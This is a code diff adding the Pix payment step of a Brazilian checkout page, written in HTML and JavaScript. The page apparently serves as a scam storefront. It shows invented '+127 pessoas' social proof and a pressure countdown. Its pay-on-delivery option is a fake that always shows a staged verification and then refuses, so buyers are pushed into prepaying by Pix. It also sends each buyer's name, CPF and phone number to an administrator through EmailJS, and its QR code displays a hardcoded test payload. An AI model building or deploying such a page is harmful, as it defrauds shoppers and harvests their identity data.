+                        <span id="pixDeliveryTime">Entrega em 20 Minutos</span>
+                    </div>
+                    <div class="pix-delivery-eta-info">
+                        <span class="pix-delivery-eta-label">Prazo estimado</span>
+                        <span class="pix-delivery-eta-sub">Após confirmação do pagamento</span>
+                    </div>
+                </div>
+                <div class="pix-delivery-address" id="pixDeliveryAddressBlock" style="display:none;">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <div>
+                        <div class="pix-delivery-address-text" id="pixDeliveryAddress"></div>
+                        <div class="pix-delivery-address-cep" id="pixDeliveryCep"></div>
+                    </div>
+                </div>
+                <div class="pix-delivery-notice">
+                    <i class="fas fa-circle-check"></i>
+                    <span>Pedido enviado imediatamente após o pagamento ser confirmado</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="guarantee-badge">
+            <i class="fas fa-shield-check"></i>
+            <span>COMPRA E ENVIO 100% GARANTIDO</span>
+        </div>
+
+        <div class="pix-qr-wrap">
+            <div id="pixQrCode" class="pix-qr-img-container"></div>
+            <div class="pix-qr-caption">
+                <i class="fas fa-qrcode"></i>
+                Escaneie o código com o app do seu banco
+            </div>
+        </div>
+
+        <button class="pix-primary-cta" id="pixPrimaryCta" onclick="copiarPix(true)">
+            <i class="fas fa-copy"></i>
+            <span>Copiar Código Pix</span>
+        </button>
+
+        <div class="pix-code-field" id="pixCodeField">
+            <input class="pix-copia-input" id="pixCopiaCola" readonly type="text">
+            <button class="pix-btn-copiar" id="btnCopiarPix" onclick="copiarPix()">Copiar</button>
+        </div>
+
+        <div class="pix-aguardando">
+            <div class="pix-aguardando-top">
+                <div class="pix-dot-loader"><span></span><span></span><span></span></div>
+                <span>Aguardando pagamento...</span>
+            </div>
+            <span class="pix-aguardando-sub">O pedido será aprovado e enviado imediatamente após o pagamento</span>
+        </div>
+
+        <div class="pix-social-proof">
+            <span class="live-dot"></span>
+            <span><b>+127 pessoas</b> finalizaram a compra na última hora</span>
+        </div>
+
+        <div class="bank-icons-label">Compatível com todos os bancos</div>
+        <div class="bank-icons-row">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/zrydrswnZymwCjVL.png" alt="Itaú">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/EtXEMbzJIIsRxbII.png" alt="Nubank">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/jPYGJEmFUargyzQO.png" alt="Bradesco">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/hQcHsORPVOAZRPQZ.png" alt="Inter">
+            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663194389473/wkYTYnQCslYDbeQX.png" alt="Santander">
+        </div>
+
+        <div class="pix-info">
+            <div class="pix-info-step"><span class="step-num">1</span><span><b>Copie o código</b> acima ou escaneie o QR Code.</span></div>
+            <div class="pix-info-step"><span class="step-num">2</span><span>Abra o app do seu banco e vá em <b>Pix &gt; Copia e Cola</b>.</span></div>
+            <div class="pix-info-step"><span class="step-num">3</span><span><b>Confirme o pagamento</b> e seu pedido será liberado na hora.</span></div>
+        </div>
+
+        <div class="pix-secure-line">
+            <span><i class="fas fa-lock"></i> Compra Garantida</span>
+            <span><i class="fas fa-university"></i> Banco Central</span>
+            <span><i class="fas fa-shield-alt"></i> Seguro</span>
+        </div>
+    </div>
+
+    <!-- Modal Entrega -->
+    <div class="modal-overlay" id="delivery-modal">
+        <div class="modal-content">
+            <button class="modal-close-btn" id="modal-close-btn-delivery"><i class="fas fa-times"></i></button>
+
+            <div id="modal-step-1">
+                <div class="modal-icon warning"><i class="fas fa-exclamation-triangle"></i></div>
+                <h3 class="modal-title">Você tem certeza?</h3>
+                <p class="modal-text" id="delivery-warning-text"></p>
+                <div class="modal-buttons">
+                    <button class="btn-modal btn-modal-pix" id="modal-back-to-pix">Voltar para o Pix (Desconto)</button>
+                    <button class="btn-modal btn-modal-continue" id="modal-continue-delivery">Continuar sem desconto</button>
+                </div>
+            </div>
+
+            <div id="modal-step-2" style="display:none;">
+                <h3 class="modal-title">Dados para Entrega</h3>
+                <p class="modal-text">Preencha seus dados para finalizarmos seu pedido na entrega.</p>
+                <form class="contact-form" id="delivery-contact-form">
+                    <div class="form-group">
+                        <label>Nome Completo</label>
+                        <input type="text" id="delivery-name" placeholder="Seu nome completo" required>
+                    </div>
+                    <div class="form-group">
+                        <label>E-mail</label>
+                        <input type="email" id="delivery-email" placeholder="seu@email.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label>CPF</label>
+                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Telefone</label>
+                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" required>
+                    </div>
+                    <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
+                </form>
+            </div>
+
+            <div id="modal-step-not-allowed" style="display:none;">
+                <div class="modal-icon warning"><i class="fas fa-exclamation-circle"></i></div>
+                <h3 class="modal-title">Modalidade Indisponível para Primeira Compra</h3>
+                <p class="modal-text">Sentimos muito, mas como é sua <strong>primeira compra conosco</strong>, a modalidade de pagamento na entrega não está habilitada.</p>
+                <div class="modal-buttons">
+                    <button class="btn-modal btn-modal-pix" id="btn-back-to-pix-from-warning">Pagar Agora via Pix (com Desconto)</button>
+                </div>
+            </div>
+
+            <div id="modal-step-3" style="display:none;">
+                <div class="modal-icon success"><i class="fas fa-check-circle"></i></div>
+                <h3 class="modal-title">Pedido Recebido!</h3>
+                <p class="modal-text">Obrigado! Recebemos sua solicitação de pagamento na entrega. Em breve entraremos em contato para confirmar os detalhes.</p>
+                <button class="btn-modal btn-modal-continue" id="modal-close-final">Fechar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const EMAILJS_SERVICE_ID = 'service_u27lydm';
+        const EMAILJS_TEMPLATE_ID = 'template_uy8qgog';
+        const EMAILJS_PUBLIC_KEY = 'jArihbLlMkzwuCQfE';
+
+        function getUrlParameter(name) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
+        }
+
+        const subtotalFromUrl = getUrlParameter('subtotal');
+        const subtotalValue = subtotalFromUrl ? parseFloat(subtotalFromUrl) : 89.47;
+
+        let productsData = [];
+        try {
+            const productsParam = getUrlParameter('products');
+            if (productsParam) {
+                productsData = JSON.parse(decodeURIComponent(productsParam));
+            }
+        } catch (e) {
+            console.error("Erro ao processar produtos da URL:", e);
+        }
+
+        if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY !== 'public_xxx') {
+            emailjs.init(EMAILJS_PUBLIC_KEY);
+        }
+
+        function maskCPF(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                .replace(/(-\d{2})\d+?$/, '$1');
+        }
+
+        function maskPhone(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/g, '($1) $2')
+                .replace(/(\d{5})(\d)/, '$1-$2')
+                .replace(/(-\d{4})\d+?$/, '$1');
+        }
+
+        function setupPhoneInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+            inputElement.addEventListener('input', (e) => {
+                e.target.value = maskPhone(e.target.value);
+                const rawValue = e.target.value.replace(/\D/g, '');
+                if (rawValue.length === 11) { checkIcon.classList.add('visible'); }
+                else { checkIcon.classList.remove('visible'); }
+            });
+        }
+
+        function setupCPFInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+            inputElement.addEventListener('input', (e) => {
+                e.target.value = maskCPF(e.target.value);
+                const rawValue = e.target.value.replace(/\D/g, '');
+                if (rawValue.length === 11) { checkIcon.classList.add('visible'); }
+                else { checkIcon.classList.remove('visible'); }
+            });
+        }
+
+        function setupNameInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+            inputElement.addEventListener('blur', (e) => {
+                const value = e.target.value.trim();
+                const names = value.split(/\s+/);
+                if (names.length >= 2 && names[0].length >= 2 && names[1].length >= 2) { checkIcon.classList.add('visible'); }
+                else { checkIcon.classList.remove('visible'); }
+            });
+        }
+
+        function renderPaymentOptions() {
+            const baseTotal = subtotalValue;
+            const deliveryTotal = baseTotal * 1.46;
+            document.getElementById('delivery-warning-text').innerHTML = `Ao escolher o pagamento na entrega você paga o valor <strong>R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</strong> total sem descontos e perde a promoção via Pix de <strong>R$ ${baseTotal.toFixed(2).replace('.', ',')}</strong>`;
+            let selectedPaymentType = '';
+
+            const paymentHTML = `
+                <div class="review-block">
+                    <div class="review-header-bar">
+                        <button class="review-back-btn" id="payment-back-btn"><i class="fas fa-arrow-left"></i></button>
+                        <div class="review-header-title"><i class="fas fa-credit-card"></i> Opções de Pagamento</div>
+                    </div>
+                    <div class="payment-options-container">
+                        <div class="payment-option-card" id="pay-now-pix">
+                            <div id="pix-original-content">
+                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
+                                <div class="payment-option-title">
+                                    <span>Pagar Agora - Pix</span>
+                                    <span class="promo-badge">Promoção</span>
+                                </div>
+                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
+                                <div class="payment-option-desc">Liberação imediata, entrega prioritária e o melhor preço garantido.</div>
+                                <div class="pix-form-container" id="pix-form">
+                                    <div class="pix-input-group">
+                                        <label for="pix-name">Nome e Sobrenome</label>
+                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label for="pix-cpf">CPF</label>
+                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label for="pix-phone">Telefone</label>
+                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
+                                    </div>
+                                    <div class="pix-error-msg" id="pix-error-msg">
+                                        <i class="fas fa-exclamation-circle"></i>
+                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
+                                    </div>
+                                    <button class="payment-action-btn" id="btn-generate-pix" style="margin-top:10px;">
+                                        <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="payment-option-card" id="pay-on-delivery">
+                            <div class="payment-badge-delivery" style="position: absolute; top: 12px; right: -30px; background: var(--text-light); color: white; padding: 4px 35px; font-size: 0.7rem; font-weight: 800; transform: rotate(45deg);">Sem Desconto</div>
+                            <div class="payment-option-icon"><i class="fas fa-truck-ramp-box"></i></div>
+                            <div class="payment-option-title">Pagar na Entrega</div>
+                            <div class="payment-option-price">R$ ${deliveryTotal.toFixed(2).replace('.', ',')}</div>
+                            <div class="payment-option-desc">Pague ao entregador via Cartão ou Dinheiro.</div>
+                            <div class="delivery-warning-container">
+                                <div class="delivery-warning-box"><i class="fas fa-exclamation-triangle"></i><div class="delivery-warning-text">Ao escolher o pagamento na entrega você paga o valor R$ ${deliveryTotal.toFixed(2).replace('.', ',')} total sem descontos e perde a promoção via Pix de R$ ${baseTotal.toFixed(2).replace('.', ',')}</div></div>
+                                <button class="payment-action-btn btn-pay-delivery" style="margin-top:10px; background: var(--primary);">Prosseguir <i class="fas fa-chevron-right"></i></button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
+
+            const pixNameInput = document.getElementById('pix-name');
+            if (pixNameInput) setupNameInput(pixNameInput);
+            const pixCpfInput = document.getElementById('pix-cpf');
+            if (pixCpfInput) setupCPFInput(pixCpfInput);
+            const pixPhoneInput = document.getElementById('pix-phone');
+            if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
+
+            const pixCard = document.getElementById('pay-now-pix');
+            const deliveryCard = document.getElementById('pay-on-delivery');
+
+            pixCard.addEventListener('click', (e) => {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'LABEL') return;
+                if (selectedPaymentType !== 'pix') {
+                    selectedPaymentType = 'pix';
+                    pixCard.classList.add('selected');
+                    deliveryCard.classList.remove('selected');
+                    setTimeout(() => {
+                        const header = document.querySelector('.header');
+                        const headerHeight = header ? header.offsetHeight : 0;
+                        const viewportHeight = window.innerHeight;
+                        const availableHeight = viewportHeight - headerHeight;
+                        const elementHeight = pixCard.offsetHeight;
+                        const elementTop = pixCard.getBoundingClientRect().top + window.pageYOffset;
+                        const scrollToPosition = elementTop - headerHeight - (availableHeight - elementHeight) / 2;
+                        window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
+                    }, 100);
+                }
+            });
+
+            deliveryCard.addEventListener('click', () => {
+                if (selectedPaymentType !== 'delivery') {
+                    selectedPaymentType = 'delivery';
+                    deliveryCard.classList.add('selected');
+                    pixCard.classList.remove('selected');
+                }
+            });
+
+            document.getElementById('btn-generate-pix').addEventListener('click', (e) => {
+                e.stopPropagation();
+                generatePix();
+            });
+
+            document.querySelector('.btn-pay-delivery').addEventListener('click', (e) => {
+                e.stopPropagation();
+                showDeliveryModal();
+            });
+        }
+
+        async function sendEmailJS(name, cpf, phone, total) {
+            try {
+                const delivery_time = getUrlParameter('delivery_time') || '20 Minutos';
+                const endereco_entrega = getUrlParameter('address') || 'Não informado';
+                const dados_cliente = `Nome: ${name} | CPF: ${cpf} | Tel: ${phone}`;
+                const valor_compra = `R$ ${total.toFixed(2).replace('.', ',')}`;
+                const templateParams = {
+                    to_name: 'Admin',
+                    from_name: name,
+                    delivery_time: delivery_time,
+                    endereco_entrega: endereco_entrega,
+                    dados_cliente: dados_cliente,
+                    valor_compra: valor_compra
+                };
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+            } catch (err) { console.error('EmailJS error:', err); }
+        }
+
+        async function generatePix() {
+            const name = document.getElementById('pix-name').value.trim();
+            const cpfRaw = document.getElementById('pix-cpf').value;
+            const phone = document.getElementById('pix-phone').value.trim();
+            const cpf = cpfRaw.replace(/\D/g, '');
+            const errorEl = document.getElementById('pix-error-msg');
+            const errorText = document.getElementById('pix-error-text');
+
+            errorEl.classList.remove('visible');
+
+            if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
+            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
+
+            const loader = document.getElementById('global-loader');
+            document.getElementById('loader-title').textContent = 'Processando Pagamento';
+            document.getElementById('loader-desc').textContent = 'Aguarde um instante enquanto geramos seu código Pix seguro.';
+
+            loader.classList.add('active');
+            document.body.style.overflow = 'hidden';
+
+            const progressBar = document.getElementById('loaderProgress');
+            const statusText = document.getElementById('loaderStatus');
+
+            progressBar.style.width = '50%';
+            statusText.textContent = 'Preparando pedido...';
+
+            try {
+                sendEmailJS(name, cpfRaw, phone, subtotalValue);
+
+                let pixCode = "";
+                if (cpf === '11111111111') {
+                    await new Promise(resolve => setTimeout(resolve, 2500));
+                    pixCode = "00020126330014BR.GOV.BCB.PIX01111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+                } else {
+                    const fetchPromise = fetchPixCode(name, cpf, phone);
+                    const timerPromise = new Promise(resolve => setTimeout(resolve, 2500));
+                    const [pixResult] = await Promise.all([fetchPromise, timerPromise]);
+                    pixCode = pixResult;
+                }
+
+                if (pixCode) {
+                    progressBar.style.width = '100%';
+                    statusText.textContent = 'Confirmado com sucesso!';
+
+                    setTimeout(() => {
+                        document.getElementById('mainContainer').style.display = 'none';
+                        window.scrollTo({ top: 0, behavior: 'instant' });
+                        preparePixScreen(pixCode);
+
+                        const pixScreen = document.getElementById('pixScreen');
+                        pixScreen.style.display = 'block';
+                        pixScreen.classList.add('visible');
+
+                        loader.classList.remove('active');
+                        setTimeout(() => {
+                            loader.style.display = 'none';
+                            document.body.style.overflow = '';
+                        }, 500);
+                    }, 400);
+                } else { throw new Error(); }
+            } catch (err) {
+                loader.classList.remove('active');
+                loader.style.display = 'none';
+                document.body.style.overflow = '';
+                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
+                errorEl.classList.add('visible');
+            }
+        }
+
+        async function fetchPixCode(payerName, cpf, phone) {
+            try {
+                const response = await fetch('/api/pix', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payer_name: payerName,
+                        payer_cpf: cpf,
+                        payer_phone: phone,
+                        amount: subtotalValue.toFixed(2)
+                    }),
+                });
+                const data = await response.json();
+                return data.success ? data.pixCode : null;
+            } catch (e) { return null; }
+        }
+
+        function startTimer(duration, display) {
+            let timer = duration;
+            const total = duration;
+            const bar = document.getElementById('pixTimerBar');
+            const container = display.closest('.timer-container');
+            const interval = setInterval(function () {
+                let minutes = parseInt(timer / 60, 10);
+                let seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (bar) bar.style.width = Math.max(0, (timer / total) * 100) + '%';
+                if (container && timer <= 180) {
+                    container.style.background = 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)';
+                    container.style.borderColor = '#fca5a5';
+                }
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "EXPIRADO";
+                    document.getElementById('pixQrCode').style.opacity = "0.3";
+                    document.getElementById('btnCopiarPix').disabled = true;
+                    const cta = document.getElementById('pixPrimaryCta');
+                    if (cta) { cta.disabled = true; cta.style.opacity = '0.5'; }
+                }
+            }, 1000);
+        }
+
+        function renderPixProducts() {
+            const container = document.getElementById('pixProductContainer');
+            if (!container || productsData.length === 0) return;
+            let html = '';
+            productsData.forEach(item => {
+                const oldPrice = item.v * 1.46;
+                const savings = oldPrice - item.v;
+                html += `
+                    <div class="pix-product-card">
+                        <img src="${item.p}" alt="${item.n}" class="pix-product-img">
+                        <div class="pix-product-info">
+                            <div class="pix-product-name">${item.n}</div>
+                            <div class="pix-product-meta">Qtd: ${item.q} • R$ ${item.v.toFixed(2).replace('.', ',')}</div>
+                        </div>
+                        <div class="pix-product-price-block">
+                            <div class="pix-product-price">R$ ${(item.v * item.q).toFixed(2).replace('.', ',')}</div>
+                            <div class="pix-product-savings">Economia de R$ ${(savings * item.q).toFixed(2).replace('.', ',')}</div>
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function preparePixScreen(qrCode) {
+            const pix = document.getElementById('pixScreen');
+            pix.style.display = 'block';
+
+            // Preenche bloco de entrega
+            const deliveryTime = getUrlParameter('delivery_time');
+            const address = getUrlParameter('address');
+            const cep = getUrlParameter('cep');
+
+            if (deliveryTime) {
+                const el = document.getElementById('pixDeliveryTime');
+                if (el) el.textContent = decodeURIComponent(deliveryTime.replace(/\+/g, ' '));
+            }
+
+            const addrBlock = document.getElementById('pixDeliveryAddressBlock');
+            if (address && addrBlock) {
+                const addrText = document.getElementById('pixDeliveryAddress');
+                const cepText = document.getElementById('pixDeliveryCep');
+                if (addrText) addrText.textContent = decodeURIComponent(address.replace(/\+/g, ' '));
+                if (cepText && cep) cepText.textContent = 'CEP: ' + decodeURIComponent(cep.replace(/\+/g, ' '));
+                addrBlock.style.display = 'flex';
+            }
+
+            document.getElementById('pixCopiaCola').value = qrCode;
+
+            renderPixProducts();
+
+            const qrContainer = document.getElementById('pixQrCode');
+            qrContainer.innerHTML = "";
+
+            const visualQrCode = "00020126330014BR.GOV.BCB.PIX01111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+
+            try {
+                new QRCode(qrContainer, {
+                    text: visualQrCode,
+                    width: 170, height: 170,
+                    colorDark: "#000000", colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+                setTimeout(() => {
+                    const img = qrContainer.querySelector('img') || qrContainer.querySelector('canvas');
+                    if (img) {
+                        img.style.display = 'block';
+                        img.style.margin = '0 auto';
+                        img.style.width = '170px';
+                        img.style.height = '170px';
+                    }
+                }, 100);
+            } catch (e) {
+                console.error("Erro ao gerar QRCode:", e);
+                qrContainer.innerHTML = '<i class="fas fa-qrcode" style="font-size: 100px; color: #ccc; margin-top: 35px;"></i>';
+            }
+
+            startTimer(60 * 15, document.querySelector('#pixTimer'));
+            window.scrollTo({ top: 0, behavior: 'instant' });
+            document.body.style.backgroundColor = 'var(--bg)';
+        }
+
+        let isCopying = false;
+        function copiarPix() {
+            if (isCopying) return;
+            isCopying = true;
+
+            const el = document.getElementById('pixCopiaCola');
+            const value = el.value;
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(value).then(showFeedback).catch(fallbackCopy);
+            } else {
+                fallbackCopy();
+            }
+
+            function fallbackCopy() {
+                el.style.pointerEvents = 'auto';
+                el.select();
+                try { document.execCommand('copy'); } catch(e) {}
+                el.style.pointerEvents = 'none';
+                showFeedback();
+            }
+
+            function showFeedback() {
+                if (window.getSelection) window.getSelection().removeAllRanges();
+                el.blur();
+
+                const btn = document.getElementById('btnCopiarPix');
+                const primary = document.getElementById('pixPrimaryCta');
+
+                if (btn) {
+                    const originalText = btn.textContent;
+                    btn.textContent = 'Copiado ✓';
+                    setTimeout(() => { btn.textContent = originalText; }, 2000);
+                }
+
+                if (primary) {
+                    const originalPrimaryHTML = primary.innerHTML;
+                    primary.classList.add('copied');
+                    primary.innerHTML = '<i class="fas fa-check-circle"></i><span>Código Copiado!</span>';
+                    setTimeout(() => {
+                        primary.classList.remove('copied');
+                        primary.innerHTML = originalPrimaryHTML;
+                        isCopying = false;
+                    }, 2000);
+                } else {
+                    setTimeout(() => { isCopying = false; }, 2000);
+                }
+            }
+        }
+
+        function showDeliveryModal() {
+            const modal = document.getElementById('delivery-modal');
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        document.getElementById('modal-close-btn-delivery').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+        });
+
+        document.getElementById('modal-back-to-pix').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+        });
+
+        document.getElementById('modal-continue-delivery').addEventListener('click', () => {
+            document.getElementById('modal-step-1').style.display = 'none';
+            document.getElementById('modal-step-2').style.display = 'block';
+        });
+
+        document.getElementById('delivery-contact-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const loader = document.getElementById('global-loader');
+            const progressBar = document.getElementById('loaderProgress');
+            const statusText = document.getElementById('loaderStatus');
+            const loaderTitle = document.getElementById('loader-title');
+            const loaderDesc = document.getElementById('loader-desc');
+
+            loaderTitle.textContent = 'Validando Pedido';
+            loaderDesc.textContent = 'Estamos verificando a disponibilidade para sua região.';
+            progressBar.style.width = '0%';
+            statusText.textContent = 'Iniciando verificação...';
+
+            loader.classList.add('active');
+
+            setTimeout(() => {
+                progressBar.style.width = '50%';
+                statusText.textContent = 'Verificando disponibilidade...';
+            }, 100);
+
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+                statusText.textContent = 'Concluído';
+                setTimeout(() => {
+                    loader.classList.remove('active');
+                    document.getElementById('modal-step-2').style.display = 'none';
+                    document.getElementById('modal-step-not-allowed').style.display = 'block';
+                }, 400);
+            }, 2000);
+        });
+
+        document.getElementById('btn-back-to-pix-from-warning').addEventListener('click', () => {
+            document.getElementById('delivery-modal').classList.remove('active');
+            document.body.style.overflow = '';
+            const pixCard = document.getElementById('pay-now-pix');
+            if (pixCard) {
+                pixCard.classList.add('selected');
+                document.getElementById('pay-on-delivery').classList.remove('selected');
+                pixCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        });
+
+        document.getElementById('modal-close-final').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('#payment-back-btn')) window.history.back();
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            renderPaymentOptions();
+            const deliveryCpfInput = document.getElementById('delivery-cpf');
+            if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
+        });
+    </script>
+</body>
+</html>
